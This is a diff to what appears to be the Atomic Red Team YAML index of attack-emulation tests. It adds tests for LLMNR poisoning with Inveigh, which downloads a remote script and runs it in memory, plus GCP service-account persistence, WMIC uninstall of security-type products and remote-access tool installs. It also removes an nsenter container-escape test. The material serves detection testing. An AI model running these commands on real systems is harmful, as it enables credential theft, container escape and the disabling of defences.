@@ -3286,7 +3286,22 @@ credential-access:
       x_mitre_is_subtechnique: true
       x_mitre_platforms:
       - Windows
-    atomic_tests: []
+      identifier: T1557.001
+    atomic_tests:
+    - name: LLMNR Poisoning with Inveigh (PowerShell)
+      auto_generated_guid: deecd55f-afe0-4a62-9fba-4d1ba2deb321
+      description: Inveigh conducts spoofing attacks and hash/credential captures
+        through both packet sniffing and protocol specific listeners/sockets. This
+        Atomic will run continuously until you cancel it or it times out.
+      supported_platforms:
+      - windows
+      executor:
+        command: |-
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          IEX (iwr "https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/82be2377ade47a4e325217b4144878a59595e750/Inveigh.ps1" -UseBasicParsing)
+          Invoke-Inveigh -ConsoleOutput Y -NBNS Y -MDNS Y -HTTPS Y -PROXY Y
+        name: powershell
+        elevation_required: true
   T1003.004:
     technique:
       external_references:
@@ -4505,7 +4520,7 @@ credential-access:
         wireshark_url:
           description: wireshark installer download URL
           type: Url
-          default: https://1.eu.dl.wireshark.org/win64/Wireshark-win64-3.4.5.exe
+          default: https://1.eu.dl.wireshark.org/win64/Wireshark-win64-latest.exe
         tshark_path:
           description: path to tshark.exe
           type: Path
@@ -9324,7 +9339,22 @@ collection:
       x_mitre_is_subtechnique: true
       x_mitre_platforms:
       - Windows
-    atomic_tests: []
+      identifier: T1557.001
+    atomic_tests:
+    - name: LLMNR Poisoning with Inveigh (PowerShell)
+      auto_generated_guid: deecd55f-afe0-4a62-9fba-4d1ba2deb321
+      description: Inveigh conducts spoofing attacks and hash/credential captures
+        through both packet sniffing and protocol specific listeners/sockets. This
+        Atomic will run continuously until you cancel it or it times out.
+      supported_platforms:
+      - windows
+      executor:
+        command: |-
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          IEX (iwr "https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/82be2377ade47a4e325217b4144878a59595e750/Inveigh.ps1" -UseBasicParsing)
+          Invoke-Inveigh -ConsoleOutput Y -NBNS Y -MDNS Y -HTTPS Y -PROXY Y
+        name: powershell
+        elevation_required: true
   T1074.001:
     technique:
       created: '2020-03-13T21:13:10.467Z'
@@ -12409,7 +12439,62 @@ privilege-escalation:
       - Administrator
       x_mitre_is_subtechnique: true
       x_mitre_version: '1.2'
-    atomic_tests: []
+      identifier: T1078.004
+    atomic_tests:
+    - name: Creating GCP Service Account and Service Account Key
+      auto_generated_guid: 9fdd83fd-bd53-46e5-a716-9dec89c8ae8e
+      description: 'GCP Service Accounts can be used to gain intial access as well
+        as maintain persistence inside Google Cloud.
+
+'
+      supported_platforms:
+      - google-workspace
+      - windows
+      - linux
+      - macos
+      input_arguments:
+        project-id:
+          description: ID of the project, you want to create service account as well
+            as service account key for
+          type: String
+          default: art-project-1
+        service-account-name:
+          description: Name of the service account
+          type: String
+          default: gcp-art-service-account-1
+        service-account-email:
+          description: Email of the service account
+          type: String
+          default: gcp-art-service-account-1@art-project-1.iam.gserviceaccount.com
+        output-key-file:
+          description: Email of the service account
+          type: String
+          default: gcp-art-service-account-1.json
+      executor:
+        name: gcloud
+        elevation_required: false
+        command: |
+          gcloud auth login --no-launch-browser
+          gcloud config set project #{project-id}
+          gcloud iam service-accounts create #{service-account-name}
+          gcloud iam service-accounts keys create #{output-key-file} --iam-account=#{service-account-email}
+        cleanup_command: 'gcloud iam service-accounts delete #{service-account-email}
+          --quiet
+
+'
+      dependency_executor_name: gcloud
+      dependencies:
+      - description: 'Requires gcloud
+
+'
+        prereq_command: 'if [ -x "$(command -v gcloud)" ]; then exit 0; else exit
+          1; fi;
+
+'
+        get_prereq_command: 'echo "Please Install Google Cloud SDK before running
+          this atomic test : https://cloud.google.com/sdk/docs/install"
+
+'
   T1546.015:
     technique:
       external_references:
@@ -22734,7 +22819,62 @@ defense-evasion:
       - Administrator
       x_mitre_is_subtechnique: true
       x_mitre_version: '1.2'
-    atomic_tests: []
+      identifier: T1078.004
+    atomic_tests:
+    - name: Creating GCP Service Account and Service Account Key
+      auto_generated_guid: 9fdd83fd-bd53-46e5-a716-9dec89c8ae8e
+      description: 'GCP Service Accounts can be used to gain intial access as well
+        as maintain persistence inside Google Cloud.
+
+'
+      supported_platforms:
+      - google-workspace
+      - windows
+      - linux
+      - macos
+      input_arguments:
+        project-id:
+          description: ID of the project, you want to create service account as well
+            as service account key for
+          type: String
+          default: art-project-1
+        service-account-name:
+          description: Name of the service account
+          type: String
+          default: gcp-art-service-account-1
+        service-account-email:
+          description: Email of the service account
+          type: String
+          default: gcp-art-service-account-1@art-project-1.iam.gserviceaccount.com
+        output-key-file:
+          description: Email of the service account
+          type: String
+          default: gcp-art-service-account-1.json
+      executor:
+        name: gcloud
+        elevation_required: false
+        command: |
+          gcloud auth login --no-launch-browser
+          gcloud config set project #{project-id}
+          gcloud iam service-accounts create #{service-account-name}
+          gcloud iam service-accounts keys create #{output-key-file} --iam-account=#{service-account-email}
+        cleanup_command: 'gcloud iam service-accounts delete #{service-account-email}
+          --quiet
+
+'
+      dependency_executor_name: gcloud
+      dependencies:
+      - description: 'Requires gcloud
+
+'
+        prereq_command: 'if [ -x "$(command -v gcloud)" ]; then exit 0; else exit
+          1; fi;
+
+'
+        get_prereq_command: 'echo "Please Install Google Cloud SDK before running
+          this atomic test : https://cloud.google.com/sdk/docs/install"
+
+'
   T1553.002:
     technique:
       external_references:
@@ -24420,70 +24560,7 @@ defense-evasion:
       - 'Pod: Pod Creation'
       - 'Pod: Pod Modification'
       - 'Application Log: Application Log Content'
-      identifier: T1610
-    atomic_tests:
-    - name: Deploy container using nsenter container escape
-      auto_generated_guid: 58004e22-022c-4c51-b4a8-2b85ac5c596b
-      description: |
-        In this escape `kubectl` is used to launch a new pod, with a container that has the host pids mapped into the container (`hostPID:true`). It uses the alpine linux container image. It runs with privilege on the host (`privileged:true`). When the container is launched the command `nsenter --mount=/proc/1/ns/mnt -- /bin/bash` is ran. Since the host processes have been mapped into the container, the container enters the host namespace, escaping the container.
-
-        Additional Details:
-        - https://twitter.com/mauilion/status/1129468485480751104
-        - https://securekubernetes.com/scenario_2_attack/
-      supported_platforms:
-      - linux
-      dependency_executor_name: sh
-      dependencies:
-      - description: Verify docker is installed.
-        prereq_command: 'which docker
-
-'
-        get_prereq_command: 'if [ "" == "`which docker`" ]; then echo "Docker Not
-          Found"; if [ -n "`which apt-get`" ]; then sudo apt-get -y install docker
-          ; elif [ -n "`which yum`" ]; then sudo yum -y install docker ; fi ; else
-          echo "Docker installed"; fi
-
-'
-      - description: Verify docker service is running.
-        prereq_command: 'sudo systemctl status docker
-
-'
-        get_prereq_command: 'sudo systemctl start docker
-
-'
-      - description: Verify kind is in the path.
-        prereq_command: 'which kind
-
-'
-        get_prereq_command: |
-          curl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.10.0/kind-linux-amd64
-          chmod +x ./kind
-          mv kind /usr/bin/kind
-      - description: Verify kind-atomic-cluster is created
-        prereq_command: 'sudo kind get clusters
-
-'
-        get_prereq_command: 'sudo kind create cluster --name atomic-cluster
-
-'
-      - description: Verify kubectl is in path
-        prereq_command: 'which kubectl
-
-'
-        get_prereq_command: |
-          curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
-          chmod +x ./kubectl
-          mv kubectl /usr/bin/kubectl
-      executor:
-        command: 'kubectl --context kind-atomic-cluster run atomic-escape-pod --restart=Never
-          -ti --rm --image alpine --overrides ''{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin":
-          true,"tty":true,"securityContext":{"privileged":true}}]}}''
-
-'
-        name: sh
-        cleanup_command: 'kubectl --context kind-atomic-cluster delete pod atomic-escape-pod
-
-'
+    atomic_tests: []
   T1006:
     technique:
       id: attack-pattern--0c8ab3eb-df48-4b9c-ace7-beacaac81cc5
@@ -42239,7 +42316,62 @@ persistence:
       - Administrator
       x_mitre_is_subtechnique: true
       x_mitre_version: '1.2'
-    atomic_tests: []
+      identifier: T1078.004
+    atomic_tests:
+    - name: Creating GCP Service Account and Service Account Key
+      auto_generated_guid: 9fdd83fd-bd53-46e5-a716-9dec89c8ae8e
+      description: 'GCP Service Accounts can be used to gain intial access as well
+        as maintain persistence inside Google Cloud.
+
+'
+      supported_platforms:
+      - google-workspace
+      - windows
+      - linux
+      - macos
+      input_arguments:
+        project-id:
+          description: ID of the project, you want to create service account as well
+            as service account key for
+          type: String
+          default: art-project-1
+        service-account-name:
+          description: Name of the service account
+          type: String
+          default: gcp-art-service-account-1
+        service-account-email:
+          description: Email of the service account
+          type: String
+          default: gcp-art-service-account-1@art-project-1.iam.gserviceaccount.com
+        output-key-file:
+          description: Email of the service account
+          type: String
+          default: gcp-art-service-account-1.json
+      executor:
+        name: gcloud
+        elevation_required: false
+        command: |
+          gcloud auth login --no-launch-browser
+          gcloud config set project #{project-id}
+          gcloud iam service-accounts create #{service-account-name}
+          gcloud iam service-accounts keys create #{output-key-file} --iam-account=#{service-account-email}
+        cleanup_command: 'gcloud iam service-accounts delete #{service-account-email}
+          --quiet
+
+'
+      dependency_executor_name: gcloud
+      dependencies:
+      - description: 'Requires gcloud
+
+'
+        prereq_command: 'if [ -x "$(command -v gcloud)" ]; then exit 0; else exit
+          1; fi;
+
+'
+        get_prereq_command: 'echo "Please Install Google Cloud SDK before running
+          this atomic test : https://cloud.google.com/sdk/docs/install"
+
+'
   T1542.002:
     technique:
       created: '2019-12-19T20:21:21.669Z'
@@ -54401,7 +54533,7 @@ discovery:
           get-childitem -recurse
           gci -recurse
         name: powershell
-    - name: Nix File and Diectory Discovery
+    - name: Nix File and Directory Discovery
       auto_generated_guid: ffc8b249-372a-4b74-adcd-e4c0430842de
       description: |
         Find or discover files on the file system
@@ -55367,7 +55499,7 @@ discovery:
         wireshark_url:
           description: wireshark installer download URL
           type: Url
-          default: https://1.eu.dl.wireshark.org/win64/Wireshark-win64-3.4.5.exe
+          default: https://1.eu.dl.wireshark.org/win64/Wireshark-win64-latest.exe
         tshark_path:
           description: path to tshark.exe
           type: Path
@@ -62055,70 +62187,7 @@ execution:
       - 'Pod: Pod Creation'
       - 'Pod: Pod Modification'
       - 'Application Log: Application Log Content'
-      identifier: T1610
-    atomic_tests:
-    - name: Deploy container using nsenter container escape
-      auto_generated_guid: 58004e22-022c-4c51-b4a8-2b85ac5c596b
-      description: |
-        In this escape `kubectl` is used to launch a new pod, with a container that has the host pids mapped into the container (`hostPID:true`). It uses the alpine linux container image. It runs with privilege on the host (`privileged:true`). When the container is launched the command `nsenter --mount=/proc/1/ns/mnt -- /bin/bash` is ran. Since the host processes have been mapped into the container, the container enters the host namespace, escaping the container.
-
-        Additional Details:
-        - https://twitter.com/mauilion/status/1129468485480751104
-        - https://securekubernetes.com/scenario_2_attack/
-      supported_platforms:
-      - linux
-      dependency_executor_name: sh
-      dependencies:
-      - description: Verify docker is installed.
-        prereq_command: 'which docker
-
-'
-        get_prereq_command: 'if [ "" == "`which docker`" ]; then echo "Docker Not
-          Found"; if [ -n "`which apt-get`" ]; then sudo apt-get -y install docker
-          ; elif [ -n "`which yum`" ]; then sudo yum -y install docker ; fi ; else
-          echo "Docker installed"; fi
-
-'
-      - description: Verify docker service is running.
-        prereq_command: 'sudo systemctl status docker
-
-'
-        get_prereq_command: 'sudo systemctl start docker
-
-'
-      - description: Verify kind is in the path.
-        prereq_command: 'which kind
-
-'
-        get_prereq_command: |
-          curl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.10.0/kind-linux-amd64
-          chmod +x ./kind
-          mv kind /usr/bin/kind
-      - description: Verify kind-atomic-cluster is created
-        prereq_command: 'sudo kind get clusters
-
-'
-        get_prereq_command: 'sudo kind create cluster --name atomic-cluster
-
-'
-      - description: Verify kubectl is in path
-        prereq_command: 'which kubectl
-
-'
-        get_prereq_command: |
-          curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
-          chmod +x ./kubectl
-          mv kubectl /usr/bin/kubectl
-      executor:
-        command: 'kubectl --context kind-atomic-cluster run atomic-escape-pod --restart=Never
-          -ti --rm --image alpine --overrides ''{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin":
-          true,"tty":true,"securityContext":{"privileged":true}}]}}''
-
-'
-        name: sh
-        cleanup_command: 'kubectl --context kind-atomic-cluster delete pod atomic-escape-pod
-
-'
+    atomic_tests: []
   T1559.002:
     technique:
       created: '2020-02-12T14:10:50.699Z'
@@ -65773,6 +65842,42 @@ execution:
 '
         cleanup_command: taskkill /f /im calculator.exe
         name: powershell
+    - name: Application uninstall using WMIC
+      auto_generated_guid: c510d25b-1667-467d-8331-a56d3e9bc4ff
+      description: Emulates uninstalling  applications using WMIC.  This method only
+        works if the product was installed with an msi file.  APTs have been seen
+        using this to uninstall security products.
+      supported_platforms:
+      - windows
+      input_arguments:
+        node:
+          description: Computer the action is being executed against but defaults
+            to the localhost.
+          type: string
+          default: 127.0.0.1
+        product:
+          description: Enter the product name being uninstalled.  This will default
+            to TightVNC.
+          type: String
+          default: Tightvnc
+      dependency_executor_name: powershell
+      dependencies:
+      - description: TightVNC must be installed.
+        prereq_command: if ((Test-Path "C:\Program Files\TightVNC\tvnviewer.exe")-Or
+          (Test-Path "C:\Program Files (x86)\TightVNC\tvnviewer.exe")) {exit 0} else
+          {exit 1}
+        get_prereq_command: |-
+          Invoke-WebRequest 'https://www.tightvnc.com/download/2.8.63/tightvnc-2.8.63-gpl-setup-64bit.msi' -OutFile PathToAtomicsFolder\T1047\bin\tightvncinstaller.msi
+          start-sleep -s 10
+          msiexec /i PathToAtomicsFolder\T1047\bin\tightvncinstaller.msi /qn /norestart
+          start-sleep -s 15
+      executor:
+        command: wmic /node:"#{node}" product where "name like '#{product}%%'" call
+          uninstall
+        cleanup_command: msiexec /i PathToAtomicsFolder\T1047\bin\tightvncinstaller.msi
+          /qn /norestart
+        name: command_prompt
+        elevation_required: true
 lateral-movement:
   T1550.001:
     technique:
@@ -70571,11 +70676,10 @@ command-and-control:
       supported_platforms:
       - windows
       executor:
-        command: |
-          Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\TeamViewer_Setup.exe https://download.teamviewer.com/download/TeamViewer_Setup.exe
-          $file1 = "C:\Users\" + $env:username + "\Desktop\TeamViewer_Setup.exe"
-          Start-Process $file1 /S;
-          Start-Process 'C:\Program Files (x86)\TeamViewer\TeamViewer.exe'
+        command: "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\TeamViewer_Setup.exe
+          https://download.teamviewer.com/download/TeamViewer_Setup.exe\n$file1 =
+          \"C:\\Users\\\" + $env:username + \"\\Desktop\\TeamViewer_Setup.exe\"\nStart-Process
+          -Wait $file1 /S; \nStart-Process 'C:\\Program Files (x86)\\TeamViewer\\TeamViewer.exe'\n"
         cleanup_command: |-
           $file = 'C:\Program Files (x86)\TeamViewer\uninstall.exe'
           if(Test-Path $file){ Start-Process $file "/S" -ErrorAction Ignore | Out-Null }
@@ -70615,8 +70719,8 @@ command-and-control:
         command: |
           Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi
           $file1 = "C:\Users\" + $env:username + "\Desktop\LogMeInIgnition.msi"
-          Start-Process $file1 /S;
-          Start-Process 'C:\Program Files (x86)\LogMeInIgnition\LMIIgnition.exe' "/S"
+          Start-Process -Wait $file1 /quiet;
+          Start-Process 'C:\Program Files (x86)\LogMeIn Ignition\LMIIgnition.exe' "/S"
         cleanup_command: "get-package *'LogMeIn Client'* -ErrorAction Ignore | uninstall-package
           \n$file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\LogMeInIgnition.msi\"\nRemove-Item
           $file1 -ErrorAction Ignore"
@@ -72315,7 +72419,62 @@ initial-access:
       - Administrator
       x_mitre_is_subtechnique: true
       x_mitre_version: '1.2'
-    atomic_tests: []
+      identifier: T1078.004
+    atomic_tests:
+    - name: Creating GCP Service Account and Service Account Key
+      auto_generated_guid: 9fdd83fd-bd53-46e5-a716-9dec89c8ae8e
+      description: 'GCP Service Accounts can be used to gain intial access as well
+        as maintain persistence inside Google Cloud.
+
+'
+      supported_platforms:
+      - google-workspace
+      - windows
+      - linux
+      - macos
+      input_arguments:
+        project-id:
+          description: ID of the project, you want to create service account as well
+            as service account key for
+          type: String
+          default: art-project-1
+        service-account-name:
+          description: Name of the service account
+          type: String
+          default: gcp-art-service-account-1
+        service-account-email:
+          description: Email of the service account
+          type: String
+          default: gcp-art-service-account-1@art-project-1.iam.gserviceaccount.com
+        output-key-file:
+          description: Email of the service account
+          type: String
+          default: gcp-art-service-account-1.json
+      executor:
+        name: gcloud
+        elevation_required: false
+        command: |
+          gcloud auth login --no-launch-browser
+          gcloud config set project #{project-id}
+          gcloud iam service-accounts create #{service-account-name}
+          gcloud iam service-accounts keys create #{output-key-file} --iam-account=#{service-account-email}
+        cleanup_command: 'gcloud iam service-accounts delete #{service-account-email}
+          --quiet
+
+'
+      dependency_executor_name: gcloud
+      dependencies:
+      - description: 'Requires gcloud
+
+'
+        prereq_command: 'if [ -x "$(command -v gcloud)" ]; then exit 0; else exit
+          1; fi;
+
+'
+        get_prereq_command: 'echo "Please Install Google Cloud SDK before running
+          this atomic test : https://cloud.google.com/sdk/docs/install"
+
+'
   T1195.003:
     technique:
       external_references:
